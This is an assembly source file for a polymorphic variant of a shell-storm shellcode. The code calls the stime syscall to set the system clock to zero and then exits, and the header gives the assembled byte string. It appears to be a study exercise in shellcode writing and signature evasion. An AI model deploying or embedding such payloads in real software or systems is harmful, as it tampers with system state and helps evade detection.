; Filename: poly_stime.nasm
; Author:   Jake
; Website:  http://github.com/14deep
; Purpose:  A polymorphic version of the stime shellcode from shell-storm
;	    www.shell-storm.org/shellcode/files/shellcode-213.php
;Shellcode: "\x31\xc0\x50\x83\xc0\x19\x87\xdc\xcd\x80\x40\xcd\x80"



global _start			

section .text
_start:

;stime(0)
xor eax, eax  ; clear eax register
push eax      ; push 0 to the stack
add eax, 25   ; add 25 to eax for the stime syscall
xchg ebx, esp ; point to the 0 in the stack
int 0x80      ; interupt to syscall

;exit
inc eax       ; if succesful, return value is 0 to eac, increment eax to be 1 for exit syscall
int 0x80      ; interupt to syscall to exit gracefully

